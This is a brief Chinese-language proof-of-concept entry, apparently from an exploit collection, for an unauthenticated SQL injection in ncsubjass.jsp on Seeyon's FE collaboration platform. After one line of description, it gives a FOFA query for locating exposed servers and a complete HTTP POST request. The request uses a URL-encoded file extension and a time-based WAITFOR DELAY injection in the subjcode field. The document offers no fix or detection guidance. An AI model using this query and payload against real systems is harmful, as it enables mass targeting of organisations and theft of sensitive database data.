## 致远互联FE协作办公平台ncsubjass存在SQL注入

致远互联FE协作办公平台ncsubjass.jsp存在SQL注入漏洞,未经身份验证的攻击者可以通过此漏洞获取数据库敏感信息。

## fofa

```
body="li_plugins_download"
```

## poc

```
POST /fenc/ncsubjass.j%73p HTTP/1.1
Host: your-ip
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
Content-Type: application/x-www-form-urlencoded
 
subjcode=';WAITFOR DELAY '0:0:5'--
```

